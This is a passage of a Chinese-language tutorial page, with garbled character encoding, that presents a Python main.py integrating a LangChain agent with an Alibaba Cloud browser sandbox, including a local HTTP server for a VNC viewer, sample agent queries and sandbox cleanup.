<h5 data-id="heading-17">æ­¥éª¤ 5: åˆ›å»ºä¸»å…¥å£æ–‡ä»¶</h5>
<p>åˆ›å»º <code>main.py</code> æ–‡ä»¶ï¼Œä½œä¸ºç¨‹åºå…¥å£ã€‚æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-string">""</span><span class="hljs-string">"
LangChain + AgentRun Browser Sandbox é›†æˆç¤ºä¾‹

ä¸»å…¥å£æ–‡ä»¶ï¼Œæ¼”ç¤ºå¦‚ä½•ä½¿ç”¨ LangChain Agent ä¸ AgentRun Browser Sandbox é›†æˆã€‚
"</span><span class="hljs-string">""</span>

<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> signal
<span class="hljs-keyword">import</span> webbrowser
<span class="hljs-keyword">import</span> urllib.<span class="hljs-property">parse</span>
<span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> http.<span class="hljs-property">server</span>
<span class="hljs-keyword">import</span> socketserver
<span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> <span class="hljs-title class_">Path</span>
<span class="hljs-keyword">from</span> dotenv <span class="hljs-keyword">import</span> load_dotenv
<span class="hljs-keyword">from</span> langchain_agent <span class="hljs-keyword">import</span> create_browser_agent, get_sandbox_manager

# åŠ è½½ç¯å¢ƒå˜é‡
<span class="hljs-title function_">load_dotenv</span>()

# å…¨å±€ <span class="hljs-variable constant_">HTTP</span> æœåŠ¡å™¨å®ä¾‹
_http_server = <span class="hljs-title class_">None</span>
_http_port = <span class="hljs-number">8080</span>

# å…¨å±€æ¸…ç†æ ‡å¿—ï¼Œç”¨äºé˜²æ­¢é‡å¤æ¸…ç†
_cleanup_done = <span class="hljs-title class_">False</span>


def <span class="hljs-title function_">start_http_server</span>():
    <span class="hljs-string">""</span><span class="hljs-string">"å¯åŠ¨ä¸€ä¸ªç®€å•çš„ HTTP æœåŠ¡å™¨æ¥æä¾› vnc.html"</span><span class="hljs-string">""</span>
    <span class="hljs-variable language_">global</span> _http_server
    
    <span class="hljs-keyword">if</span> _http_server is not <span class="hljs-title class_">None</span>:
        <span class="hljs-keyword">return</span> _http_port
    
    <span class="hljs-attr">try</span>:
        current_dir = <span class="hljs-title class_">Path</span>(__file__).<span class="hljs-property">parent</span>.<span class="hljs-title function_">absolute</span>()
        
        <span class="hljs-keyword">class</span> <span class="hljs-title class_">VNCRequestHandler</span>(http.<span class="hljs-property">server</span>.<span class="hljs-property">SimpleHTTPRequestHandler</span>):
            def <span class="hljs-title function_">__init__</span>(self, *args, **kwargs):
                <span class="hljs-variable language_">super</span>().<span class="hljs-title function_">__init__</span>(*args, directory=<span class="hljs-title function_">str</span>(current_dir), **kwargs)
            
            def <span class="hljs-title function_">log_message</span>(self, format, *args):
                # é™é»˜æ—¥å¿—ï¼Œé¿å…è¾“å‡ºè¿‡å¤šä¿¡æ¯
                pass
        
        # å°è¯•å¯åŠ¨æœåŠ¡å™¨
        <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> <span class="hljs-title function_">range</span>(_http_port, _http_port + <span class="hljs-number">10</span>):
            <span class="hljs-attr">try</span>:
                server = socketserver.<span class="hljs-title class_">TCPServer</span>((<span class="hljs-string">""</span>, port), <span class="hljs-title class_">VNCRequestHandler</span>)
                server.<span class="hljs-property">allow_reuse_address</span> = <span class="hljs-title class_">True</span>
                
                # åœ¨åå°çº¿ç¨‹ä¸­è¿è¡ŒæœåŠ¡å™¨
                def <span class="hljs-title function_">run_server</span>():
                    server.<span class="hljs-title function_">serve_forever</span>()
                
                thread = threading.<span class="hljs-title class_">Thread</span>(target=run_server, daemon=<span class="hljs-title class_">True</span>)
                thread.<span class="hljs-title function_">start</span>()
                
                _http_server = server
                <span class="hljs-keyword">return</span> port
            except <span class="hljs-title class_">OSError</span>:
                <span class="hljs-keyword">continue</span>
        
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">None</span>
    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-title function_">print</span>(f<span class="hljs-string">"å¯åŠ¨ HTTP æœåŠ¡å™¨å¤±è´¥: {str(e)}"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">None</span>


def <span class="hljs-title function_">open_vnc_viewer</span>(<span class="hljs-attr">vnc_url</span>: str):
    <span class="hljs-string">""</span><span class="hljs-string">"
    è‡ªåŠ¨æ‰“å¼€ VNC æŸ¥çœ‹å™¨å¹¶è®¾ç½® VNC URL
    
    Args:
        vnc_url: VNC WebSocket URL
    "</span><span class="hljs-string">""</span>
    <span class="hljs-keyword">if</span> not <span class="hljs-attr">vnc_url</span>:
        <span class="hljs-keyword">return</span>
    
    <span class="hljs-attr">try</span>:
        # è·å–å½“å‰æ–‡ä»¶æ‰€åœ¨ç›®å½•
        current_dir = <span class="hljs-title class_">Path</span>(__file__).<span class="hljs-property">parent</span>.<span class="hljs-title function_">absolute</span>()
        vnc_html_path = current_dir / <span class="hljs-string">"vnc.html"</span>
        
        # æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨
        <span class="hljs-keyword">if</span> not vnc_html_path.<span class="hljs-title function_">exists</span>():
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"è­¦å‘Š: vnc.html æ–‡ä»¶ä¸å­˜åœ¨: {vnc_html_path}"</span>)
            <span class="hljs-title function_">print_vnc_info</span>(vnc_url)
            <span class="hljs-keyword">return</span>
        
        # å¯åŠ¨ <span class="hljs-variable constant_">HTTP</span> æœåŠ¡å™¨
        port = <span class="hljs-title function_">start_http_server</span>()
        
        <span class="hljs-keyword">if</span> <span class="hljs-attr">port</span>:
            # ç¼–ç  <span class="hljs-variable constant_">VNC</span> <span class="hljs-variable constant_">URL</span> ä½œä¸º <span class="hljs-variable constant_">URL</span> å‚æ•°
            encoded_url = urllib.<span class="hljs-property">parse</span>.<span class="hljs-title function_">quote</span>(vnc_url, safe=<span class="hljs-string">''</span>)
            
            # æ„å»º <span class="hljs-variable constant_">HTTP</span> <span class="hljs-variable constant_">URL</span>
            http_url = f<span class="hljs-string">"http://localhost:{port}/vnc.html?url={encoded_url}"</span>
            
            # æ‰“å¼€æµè§ˆå™¨
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"\næ­£åœ¨æ‰“å¼€ VNC æŸ¥çœ‹å™¨..."</span>)
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"HTTP æœåŠ¡å™¨è¿è¡Œåœ¨: http://localhost:{port}"</span>)
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"VNC URL: {vnc_url[:80]}..."</span>)
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"å®Œæ•´ URL: {http_url[:100]}..."</span>)
            webbrowser.<span class="hljs-title function_">open</span>(http_url)
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"VNC æŸ¥çœ‹å™¨å·²æ‰“å¼€"</span>)
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"VNC URL å·²é€šè¿‡ URL å‚æ•°è‡ªåŠ¨è®¾ç½®ï¼Œé¡µé¢åŠ è½½åä¼šè‡ªåŠ¨è¿æ¥"</span>)
        <span class="hljs-attr">else</span>:
            # å¦‚æœ <span class="hljs-variable constant_">HTTP</span> æœåŠ¡å™¨å¯åŠ¨å¤±è´¥ï¼Œå°è¯•ä½¿ç”¨ <span class="hljs-attr">file</span>:<span class="hljs-comment">// åè®®</span>
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"HTTP æœåŠ¡å™¨å¯åŠ¨å¤±è´¥ï¼Œå°è¯•ä½¿ç”¨æ–‡ä»¶åè®®..."</span>)
            encoded_url = urllib.<span class="hljs-property">parse</span>.<span class="hljs-title function_">quote</span>(vnc_url, safe=<span class="hljs-string">''</span>)
            file_url = f<span class="hljs-string">"file://{vnc_html_path}?url={encoded_url}"</span>
            webbrowser.<span class="hljs-title function_">open</span>(file_url)
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"VNC æŸ¥çœ‹å™¨å·²æ‰“å¼€ï¼ˆä½¿ç”¨æ–‡ä»¶åè®®ï¼‰"</span>)
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"æç¤º: å¦‚æœæ— æ³•è‡ªåŠ¨è¿æ¥ï¼Œè¯·æ‰‹åŠ¨å¤åˆ¶ VNC URL åˆ°è¾“å…¥æ¡†"</span>)
        
    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-title function_">print</span>(f<span class="hljs-string">"è‡ªåŠ¨æ‰“å¼€ VNC æŸ¥çœ‹å™¨å¤±è´¥: {str(e)}"</span>)
        <span class="hljs-title function_">print_vnc_info</span>(vnc_url)


def <span class="hljs-title function_">print_vnc_info</span>(<span class="hljs-attr">vnc_url</span>: str):
    <span class="hljs-string">""</span><span class="hljs-string">"æ‰“å° VNC è¿æ¥ä¿¡æ¯"</span><span class="hljs-string">""</span>
    <span class="hljs-keyword">if</span> not <span class="hljs-attr">vnc_url</span>:
        <span class="hljs-keyword">return</span>
    
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n"</span> + <span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"VNC å¯è§†åŒ–è¿æ¥ä¿¡æ¯"</span>)
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
    <span class="hljs-title function_">print</span>(f<span class="hljs-string">"\nVNC URL: {vnc_url}"</span>)
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"\nä½¿ç”¨æ–¹å¼:"</span>)
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"   1. ä½¿ç”¨ noVNC å®¢æˆ·ç«¯è¿æ¥"</span>)
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"   2. æˆ–åœ¨æµè§ˆå™¨ä¸­è®¿é—® VNC æŸ¥çœ‹å™¨é¡µé¢"</span>)
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"   3. å®æ—¶æŸ¥çœ‹æµè§ˆå™¨æ“ä½œè¿‡ç¨‹"</span>)
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n"</span> + <span class="hljs-string">"="</span> * <span class="hljs-number">60</span> + <span class="hljs-string">"\n"</span>)


def <span class="hljs-title function_">cleanup_sandbox</span>():
    <span class="hljs-string">""</span><span class="hljs-string">"
    æ¸…ç† sandbox èµ„æº
    
    è¿™ä¸ªå‡½æ•°å¯ä»¥è¢«ä¿¡å·å¤„ç†å™¨ã€å¼‚å¸¸å¤„ç†å™¨å’Œæ­£å¸¸é€€å‡ºæµç¨‹è°ƒç”¨
    "</span><span class="hljs-string">""</span>
    <span class="hljs-variable language_">global</span> _cleanup_done
    
    # é˜²æ­¢é‡å¤æ¸…ç†
    <span class="hljs-keyword">if</span> <span class="hljs-attr">_cleanup_done</span>:
        <span class="hljs-keyword">return</span>
    
    _cleanup_done = <span class="hljs-title class_">True</span>
    
    <span class="hljs-attr">try</span>:
        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
        <span class="hljs-keyword">if</span> manager.<span class="hljs-title function_">is_active</span>():
            <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n"</span> + <span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
            <span class="hljs-title function_">print</span>(<span class="hljs-string">"æ­£åœ¨æ¸…ç† sandbox..."</span>)
            <span class="hljs-title function_">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
            result = manager.<span class="hljs-title function_">destroy</span>()
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"æ¸…ç†ç»“æœ: {result}\n"</span>)
        <span class="hljs-attr">else</span>:
            <span class="hljs-title function_">print</span>(<span class="hljs-string">"\næ²¡æœ‰æ´»åŠ¨çš„ sandbox éœ€è¦æ¸…ç†\n"</span>)
    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-title function_">print</span>(f<span class="hljs-string">"\næ¸…ç† sandbox æ—¶å‡ºé”™: {str(e)}\n"</span>)


def <span class="hljs-title function_">signal_handler</span>(signum, frame):
    <span class="hljs-string">""</span><span class="hljs-string">"
    ä¿¡å·å¤„ç†å™¨ï¼Œå¤„ç† Ctrl+C (SIGINT) å’Œå…¶ä»–ä¿¡å·
    
    Args:
        signum: ä¿¡å·ç¼–å·
        frame: å½“å‰å †æ ˆå¸§
    "</span><span class="hljs-string">""</span>
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n\næ”¶åˆ°ä¸­æ–­ä¿¡å·ï¼Œæ­£åœ¨æ¸…ç†èµ„æº..."</span>)
    <span class="hljs-title function_">cleanup_sandbox</span>()
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"æ¸…ç†å®Œæˆ"</span>)
    sys.<span class="hljs-title function_">exit</span>(<span class="hljs-number">0</span>)


def <span class="hljs-title function_">main</span>():
    <span class="hljs-string">""</span><span class="hljs-string">"ä¸»å‡½æ•°"</span><span class="hljs-string">""</span>
    <span class="hljs-variable language_">global</span> _cleanup_done
    
    # é‡ç½®æ¸…ç†æ ‡å¿—
    _cleanup_done = <span class="hljs-title class_">False</span>
    
    # æ³¨å†Œä¿¡å·å¤„ç†å™¨ï¼Œå¤„ç† <span class="hljs-title class_">Ctrl</span>+C (<span class="hljs-variable constant_">SIGINT</span>)
    signal.<span class="hljs-title function_">signal</span>(signal.<span class="hljs-property">SIGINT</span>, signal_handler)
    
    # åœ¨ <span class="hljs-title class_">Windows</span> ä¸Šï¼Œ<span class="hljs-variable constant_">SIGBREAK</span> ä¹Ÿå¯ä»¥å¤„ç†
    <span class="hljs-keyword">if</span> <span class="hljs-title function_">hasattr</span>(signal, <span class="hljs-string">'SIGBREAK'</span>):
        signal.<span class="hljs-title function_">signal</span>(signal.<span class="hljs-property">SIGBREAK</span>, signal_handler)
    
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"LangChain + AgentRun Browser Sandbox é›†æˆç¤ºä¾‹"</span>)
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
    <span class="hljs-title function_">print</span>()
    
    <span class="hljs-attr">try</span>:
        # åˆ›å»º <span class="hljs-title class_">Agent</span>
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"æ­£åœ¨åˆå§‹åŒ– LangChain Agent..."</span>)
        agent = <span class="hljs-title function_">create_browser_agent</span>()
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"Agent åˆå§‹åŒ–å®Œæˆ\n"</span>)
        
        # ç¤ºä¾‹æŸ¥è¯¢
        queries = [
            <span class="hljs-string">"åˆ›å»ºä¸€ä¸ªæµè§ˆå™¨ sandbox"</span>,
            <span class="hljs-string">"è·å–å½“å‰ sandbox çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬ VNC URL"</span>,
            <span class="hljs-string">"å¯¼èˆªåˆ° https://www.aliyun.com"</span>,
            <span class="hljs-string">"æˆªå–å½“å‰é¡µé¢æˆªå›¾"</span>,
        ]
        
        # æ‰§è¡ŒæŸ¥è¯¢
        <span class="hljs-keyword">for</span> i, query <span class="hljs-keyword">in</span> <span class="hljs-title function_">enumerate</span>(queries, <span class="hljs-number">1</span>):
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"\n{'=' * 60}"</span>)
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"æŸ¥è¯¢ {i}: {query}"</span>)
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"{'=' * 60}\n"</span>)
            
            <span class="hljs-attr">try</span>:
                result = agent.<span class="hljs-title function_">invoke</span>({
                    <span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: query}]
                })
                
                # æå–æœ€åä¸€æ¡æ¶ˆæ¯çš„å†…å®¹
                output = result.<span class="hljs-title function_">get</span>(<span class="hljs-string">"messages"</span>, [])[-<span class="hljs-number">1</span>].<span class="hljs-property">content</span> <span class="hljs-keyword">if</span> <span class="hljs-title function_">isinstance</span>(result.<span class="hljs-title function_">get</span>(<span class="hljs-string">"messages"</span>), list) <span class="hljs-keyword">else</span> result.<span class="hljs-title function_">get</span>(<span class="hljs-string">"output"</span>, <span class="hljs-title function_">str</span>(result))
                <span class="hljs-title function_">print</span>(f<span class="hljs-string">"\nç»“æœ:\n{output}\n"</span>)
                
                # å¦‚æœæ˜¯åˆ›å»º sandboxï¼Œè‡ªåŠ¨æ‰“å¼€ <span class="hljs-variable constant_">VNC</span> æŸ¥çœ‹å™¨
                <span class="hljs-keyword">if</span> i == <span class="hljs-number">1</span>:
                    <span class="hljs-attr">try</span>:
                        # ç­‰å¾…ä¸€ä¸‹ç¡®ä¿ sandbox å®Œå…¨åˆ›å»º
                        <span class="hljs-keyword">import</span> time
                        time.<span class="hljs-title function_">sleep</span>(<span class="hljs-number">1</span>)
                        
                        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
                        <span class="hljs-keyword">if</span> manager.<span class="hljs-title function_">is_active</span>():
                            info = manager.<span class="hljs-title function_">get_info</span>()
                            vnc_url = info.<span class="hljs-title function_">get</span>(<span class="hljs-string">'vnc_url'</span>)
                            <span class="hljs-keyword">if</span> <span class="hljs-attr">vnc_url</span>:
                                <span class="hljs-title function_">print</span>(f<span class="hljs-string">"\næ£€æµ‹åˆ° VNC URL: {vnc_url[:80]}..."</span>)
                                <span class="hljs-title function_">open_vnc_viewer</span>(vnc_url)
                                <span class="hljs-title function_">print_vnc_info</span>(vnc_url)
                            <span class="hljs-attr">else</span>:
                                <span class="hljs-title function_">print</span>(<span class="hljs-string">"\nè­¦å‘Š: æœªè·å–åˆ° VNC URLï¼Œè¯·æ£€æŸ¥ sandbox åˆ›å»ºæ˜¯å¦æˆåŠŸ"</span>)
                    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
                        <span class="hljs-title function_">print</span>(f<span class="hljs-string">"æ‰“å¼€ VNC æŸ¥çœ‹å™¨æ—¶å‡ºé”™: {str(e)}"</span>)
                        <span class="hljs-keyword">import</span> traceback
                        traceback.<span class="hljs-title function_">print_exc</span>()
                
                # å¦‚æœæ˜¯è·å–ä¿¡æ¯ï¼Œæ˜¾ç¤º <span class="hljs-variable constant_">VNC</span> ä¿¡æ¯
                elif i == <span class="hljs-number">2</span>:
                    <span class="hljs-attr">try</span>:
                        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
                        <span class="hljs-keyword">if</span> manager.<span class="hljs-title function_">is_active</span>():
                            info = manager.<span class="hljs-title function_">get_info</span>()
                            <span class="hljs-keyword">if</span> info.<span class="hljs-title function_">get</span>(<span class="hljs-string">'vnc_url'</span>):
                                <span class="hljs-title function_">print_vnc_info</span>(info[<span class="hljs-string">'vnc_url'</span>])
                    <span class="hljs-attr">except</span>:
                        pass
            
            except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
                <span class="hljs-title function_">print</span>(f<span class="hljs-string">"æŸ¥è¯¢å¤±è´¥: {str(e)}\n"</span>)
                <span class="hljs-keyword">import</span> traceback
                traceback.<span class="hljs-title function_">print_exc</span>()
        
        # äº¤äº’å¼æŸ¥è¯¢
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n"</span> + <span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"è¿›å…¥äº¤äº’æ¨¡å¼ï¼ˆè¾“å…¥ 'quit' æˆ– 'exit' é€€å‡ºï¼ŒCtrl+C æˆ– Ctrl+D ä¸­æ–­ï¼‰"</span>)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span> + <span class="hljs-string">"\n"</span>)
        
        <span class="hljs-keyword">while</span> <span class="hljs-title class_">True</span>:
            <span class="hljs-attr">try</span>:
                user_input = <span class="hljs-title function_">input</span>(<span class="hljs-string">"è¯·è¾“å…¥æ‚¨çš„æŸ¥è¯¢: "</span>).<span class="hljs-title function_">strip</span>()
            except <span class="hljs-title class_">EOFError</span>:
                # å¤„ç† <span class="hljs-title class_">Ctrl</span>+D (<span class="hljs-variable constant_">EOF</span>)
                <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n\næ£€æµ‹åˆ°è¾“å…¥ç»“æŸ (Ctrl+D)ï¼Œæ­£åœ¨æ¸…ç†èµ„æº..."</span>)
                <span class="hljs-title function_">cleanup_sandbox</span>()
                <span class="hljs-title function_">print</span>(<span class="hljs-string">"æ¸…ç†å®Œæˆ"</span>)
                <span class="hljs-keyword">break</span>
            except <span class="hljs-title class_">KeyboardInterrupt</span>:
                # å¤„ç† <span class="hljs-title class_">Ctrl</span>+C (åœ¨ input è°ƒç”¨æœŸé—´)
                <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n\næ£€æµ‹åˆ°ä¸­æ–­ä¿¡å· (Ctrl+C)ï¼Œæ­£åœ¨æ¸…ç†èµ„æº..."</span>)
                <span class="hljs-title function_">cleanup_sandbox</span>()
                <span class="hljs-title function_">print</span>(<span class="hljs-string">"æ¸…ç†å®Œæˆ"</span>)
                <span class="hljs-keyword">break</span>
            
            <span class="hljs-keyword">if</span> not <span class="hljs-attr">user_input</span>:
                <span class="hljs-keyword">continue</span>
            
            <span class="hljs-keyword">if</span> user_input.<span class="hljs-title function_">lower</span>() <span class="hljs-keyword">in</span> [<span class="hljs-string">'quit'</span>, <span class="hljs-string">'exit'</span>, <span class="hljs-string">'é€€å‡º'</span>]:
                <span class="hljs-title function_">print</span>(<span class="hljs-string">"\nBye"</span>)
                # é€€å‡ºå‰æ¸…ç† sandbox
                <span class="hljs-title function_">cleanup_sandbox</span>()
                <span class="hljs-keyword">break</span>
            
            <span class="hljs-attr">try</span>:
                result = agent.<span class="hljs-title function_">invoke</span>({
                    <span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: user_input}]
                })
                
                output = result.<span class="hljs-title function_">get</span>(<span class="hljs-string">"messages"</span>, [])[-<span class="hljs-number">1</span>].<span class="hljs-property">content</span> <span class="hljs-keyword">if</span> <span class="hljs-title function_">isinstance</span>(result.<span class="hljs-title function_">get</span>(<span class="hljs-string">"messages"</span>), list) <span class="hljs-keyword">else</span> result.<span class="hljs-title function_">get</span>(<span class="hljs-string">"output"</span>, <span class="hljs-title function_">str</span>(result))
                <span class="hljs-title function_">print</span>(f<span class="hljs-string">"\nç»“æœ:\n{output}\n"</span>)
                
                # æ£€æŸ¥æ˜¯å¦éœ€è¦æ‰“å¼€æˆ–æ˜¾ç¤º <span class="hljs-variable constant_">VNC</span> ä¿¡æ¯
                user_input_lower = user_input.<span class="hljs-title function_">lower</span>()
                <span class="hljs-keyword">if</span> <span class="hljs-string">"åˆ›å»º"</span> <span class="hljs-keyword">in</span> user_input_lower and <span class="hljs-string">"sandbox"</span> <span class="hljs-keyword">in</span> <span class="hljs-attr">user_input_lower</span>:
                    # å¦‚æœæ˜¯åˆ›å»º sandboxï¼Œè‡ªåŠ¨æ‰“å¼€ <span class="hljs-variable constant_">VNC</span> æŸ¥çœ‹å™¨
                    <span class="hljs-attr">try</span>:
                        # ç­‰å¾…ä¸€ä¸‹ç¡®ä¿ sandbox å®Œå…¨åˆ›å»º
                        <span class="hljs-keyword">import</span> time
                        time.<span class="hljs-title function_">sleep</span>(<span class="hljs-number">1</span>)
                        
                        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
                        <span class="hljs-keyword">if</span> manager.<span class="hljs-title function_">is_active</span>():
                            info = manager.<span class="hljs-title function_">get_info</span>()
                            vnc_url = info.<span class="hljs-title function_">get</span>(<span class="hljs-string">'vnc_url'</span>)
                            <span class="hljs-keyword">if</span> <span class="hljs-attr">vnc_url</span>:
                                <span class="hljs-title function_">print</span>(f<span class="hljs-string">"\næ£€æµ‹åˆ° VNC URL: {vnc_url[:80]}..."</span>)
                                <span class="hljs-title function_">open_vnc_viewer</span>(vnc_url)
                                <span class="hljs-title function_">print_vnc_info</span>(vnc_url)
                            <span class="hljs-attr">else</span>:
                                <span class="hljs-title function_">print</span>(<span class="hljs-string">"\nè­¦å‘Š: æœªè·å–åˆ° VNC URLï¼Œè¯·æ£€æŸ¥ sandbox åˆ›å»ºæ˜¯å¦æˆåŠŸ"</span>)
                    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
                        <span class="hljs-title function_">print</span>(f<span class="hljs-string">"æ‰“å¼€ VNC æŸ¥çœ‹å™¨æ—¶å‡ºé”™: {str(e)}"</span>)
                        <span class="hljs-keyword">import</span> traceback
                        traceback.<span class="hljs-title function_">print_exc</span>()
                elif <span class="hljs-string">"sandbox"</span> <span class="hljs-keyword">in</span> user_input_lower or <span class="hljs-string">"vnc"</span> <span class="hljs-keyword">in</span> <span class="hljs-attr">user_input_lower</span>:
                    # å…¶ä»–æƒ…å†µåªæ˜¾ç¤ºä¿¡æ¯
                    <span class="hljs-attr">try</span>:
                        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
                        <span class="hljs-keyword">if</span> manager.<span class="hljs-title function_">is_active</span>():
                            info = manager.<span class="hljs-title function_">get_info</span>()
                            <span class="hljs-keyword">if</span> info.<span class="hljs-title function_">get</span>(<span class="hljs-string">'vnc_url'</span>):
                                <span class="hljs-title function_">print_vnc_info</span>(info[<span class="hljs-string">'vnc_url'</span>])
                    <span class="hljs-attr">except</span>:
                        pass
            
            except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
                <span class="hljs-title function_">print</span>(f<span class="hljs-string">"æŸ¥è¯¢å¤±è´¥: {str(e)}\n"</span>)
                <span class="hljs-keyword">import</span> traceback
                traceback.<span class="hljs-title function_">print_exc</span>()
        
        # æ¸…ç†èµ„æºï¼ˆä»…åœ¨ç¨‹åºæ­£å¸¸é€€å‡ºæ—¶ï¼‰
        <span class="hljs-title function_">cleanup_sandbox</span>()
    
    except <span class="hljs-title class_">KeyboardInterrupt</span>:
        # å¤„ç†é¡¶å±‚ <span class="hljs-title class_">KeyboardInterrupt</span> (<span class="hljs-title class_">Ctrl</span>+C)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n\næ£€æµ‹åˆ°ä¸­æ–­ä¿¡å· (Ctrl+C)ï¼Œæ­£åœ¨æ¸…ç†èµ„æº..."</span>)
        <span class="hljs-title function_">cleanup_sandbox</span>()
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"æ¸…ç†å®Œæˆ"</span>)
        sys.<span class="hljs-title function_">exit</span>(<span class="hljs-number">0</span>)
    except <span class="hljs-title class_">EOFError</span>:
        # å¤„ç†é¡¶å±‚ <span class="hljs-title class_">EOFError</span> (<span class="hljs-title class_">Ctrl</span>+D)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n\næ£€æµ‹åˆ°è¾“å…¥ç»“æŸ (Ctrl+D)ï¼Œæ­£åœ¨æ¸…ç†èµ„æº..."</span>)
        <span class="hljs-title function_">cleanup_sandbox</span>()
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"æ¸…ç†å®Œæˆ"</span>)
        sys.<span class="hljs-title function_">exit</span>(<span class="hljs-number">0</span>)
    except <span class="hljs-title class_">ValueError</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-title function_">print</span>(f<span class="hljs-string">"é…ç½®é”™è¯¯: {str(e)}"</span>)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"\næç¤º: è¯·ç¡®ä¿å·²è®¾ç½®ä»¥ä¸‹ç¯å¢ƒå˜é‡:"</span>)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"   - DASHSCOPE_API_KEY: DashScope API Key"</span>)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"   - ALIBABA_CLOUD_ACCOUNT_ID: é˜¿é‡Œäº‘è´¦å· ID"</span>)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"   - ALIBABA_CLOUD_ACCESS_KEY_ID: è®¿é—®å¯†é’¥ ID"</span>)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"   - ALIBABA_CLOUD_ACCESS_KEY_SECRET: è®¿é—®å¯†é’¥ Secret"</span>)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"   - ALIBABA_CLOUD_REGION: åŒºåŸŸï¼ˆé»˜è®¤: cn-hangzhouï¼‰"</span>)
    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-title function_">print</span>(f<span class="hljs-string">"å‘ç”Ÿé”™è¯¯: {str(e)}"</span>)
        <span class="hljs-keyword">import</span> traceback
        traceback.<span class="hljs-title function_">print_exc</span>()
        # å‘ç”Ÿé”™è¯¯æ—¶ä¹Ÿå°è¯•æ¸…ç†
        <span class="hljs-title function_">cleanup_sandbox</span>()


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-title function_">main</span>()
</code></pre>
<p><strong>å…³é”®åŠŸèƒ½ï¼š</strong></p>
<ol>
<li><strong>VNC è‡ªåŠ¨æ‰“å¼€</strong>: åˆ›å»º Sandbox åè‡ªåŠ¨æ‰“å¼€ VNC æŸ¥çœ‹å™¨</li>
